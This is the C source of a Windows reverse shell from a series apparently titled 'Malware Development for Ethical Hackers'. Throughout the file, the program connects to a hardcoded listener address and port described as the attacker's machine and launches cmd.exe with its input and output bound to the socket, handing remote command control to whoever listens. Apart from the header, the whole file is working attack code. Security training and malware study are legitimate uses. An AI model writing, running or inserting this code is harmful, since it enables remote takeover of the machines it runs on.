/*
 * Malware Development for Ethical Hackers
 * hack.c
 * windows reverse shell without any encryption/encoding
 * author: @cocomelonc
*/
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

int main(int argc, char* argv[]) {
  // listener ip, port on attacker's machine
  char *ip = "10.10.1.5";
  short port = 4444;

  // init socket lib
  WSAStartup(MAKEWORD(2, 2), &wsaData);

  // create socket
  wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(port);
  hax.sin_addr.s_addr = inet_addr(ip);

  // connect to remote host
  WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

  memset(&sui, 0, sizeof(sui));
  sui.cb = sizeof(sui);
  sui.dwFlags = STARTF_USESTDHANDLES;
  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

  // start cmd.exe with redirected streams
  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
  exit(0);
}
